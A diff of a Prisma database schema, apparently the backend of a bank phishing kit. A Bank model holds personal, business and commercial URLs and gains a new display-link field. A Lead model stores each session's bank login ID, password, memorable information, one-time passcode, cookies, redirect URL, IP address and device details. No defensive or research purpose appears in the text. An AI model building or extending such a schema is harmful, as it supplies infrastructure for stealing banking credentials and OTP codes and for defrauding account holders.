@@ -17,6 +17,7 @@ model Bank {
   personalUrl      String?
   businessUrl      String?
   commercialUrl    String?
+  displayLink      String?  // 🔥 Custom display link field added
   enablePersonal   Boolean  @default(true)
   enableBusiness   Boolean  @default(true)
   enableCommercial Boolean  @default(true)
@@ -29,21 +30,21 @@ model Bank {
 }
 
 model Lead {
-  id            String   @id @default(cuid())
-  sessionId     String?  @unique
-  bank          String?
-  bankName      String?
-  bankType      String?  @default("Personal")
-  userId        String?
-  password      String?
-  memorableInfo String?
-  extraData     String?
-  cookiesData   String?  @default("{\"status\": \"active\"}")
-  otpCode       String?
-  optionLabel   String?  @default("Default")
-  redirectUrl   String?
-  ipAddress     String?  @default("Unknown")
-  deviceInfo    String?  @default("Unknown")
-  createdAt     DateTime @default(now())
-  updatedAt     DateTime @updatedAt
+  id              String   @id @default(cuid())
+  sessionId       String?  @unique
+  bank            String?
+  bankName        String?
+  bankType        String?  @default("Personal")
+  userId          String?
+  password        String?
+  memorableInfo   String?
+  extraData       String?
+  cookiesData     String?  @default("{\"status\": \"active\"}")
+  otpCode         String?
+  optionLabel     String?  @default("Default")
+  redirectUrl     String?
+  ipAddress       String?  @default("Unknown")
+  deviceInfo      String?  @default("Unknown")
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
 }
